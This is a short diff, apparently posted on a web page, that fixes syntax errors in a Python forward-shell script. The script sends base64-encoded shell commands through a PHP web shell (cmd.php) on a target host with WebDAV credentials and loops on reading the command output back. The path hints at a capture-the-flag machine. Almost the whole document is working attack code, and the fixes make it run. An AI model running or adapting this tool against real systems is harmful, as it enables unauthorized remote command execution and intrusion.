@@ -24,9 +24,9 @@ from random import randrange<br/>
 import threading<br/>
 <br/>
 class AllTheReads(object):<br/>
-&nbsp; &nbsp; def __init__(self, interval=1)<br/>
+&nbsp; &nbsp; def __init__(self, interval=1):<br/>
 &nbsp; &nbsp; &nbsp; &nbsp; self.interval = interval<br/>
-&nbsp; &nbsp; &nbsp; &nbsp; thread = threading.Thread(target=self.run, args())<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; thread = threading.Thread(target=self.run, args=())<br/>
 &nbsp; &nbsp; &nbsp; &nbsp; thread.daemon = True<br/>
 &nbsp; &nbsp; &nbsp; &nbsp; thread.start()<br/>
 &nbsp; &nbsp; <br/>
@@ -36,7 +36,7 @@ class AllTheReads(object):<br/>
 &nbsp; &nbsp; &nbsp; &nbsp; while True:<br/>
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; output = RunCmd(readoutput)<br/>
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if output:<br/>
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; runCmd(clearoutput)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RunCmd(clearoutput)<br/>
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(output)<br/>
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; time.sleep(self.interval)<br/>
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
@@ -53,7 +53,7 @@ def WriteCmd(cmd):<br/>
 &nbsp; &nbsp; cmd = cmd.encode('utf-8')<br/>
 &nbsp; &nbsp; cmd = b64encode(cmd).decode('utf-8')<br/>
 &nbsp; &nbsp; payload = {<br/>
-&nbsp; &nbsp; &nbsp; &nbsp; ipp' : 'echo "%s" | base64 -d &gt; %s' % (cmd, stdin)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; 'ipp' : 'echo "%s" | base64 -d &gt; %s' % (cmd, stdin)<br/>
 &nbsp; &nbsp; }<br/>
 &nbsp; &nbsp; result = (requests.post('http://&lt;IP&gt;/webdav_test_inception/cmd.php', params=payload,auth=('webdav_test','&lt;password&gt;'), timeout=5).text).strip()<br/>
 &nbsp; &nbsp; return result<br/>
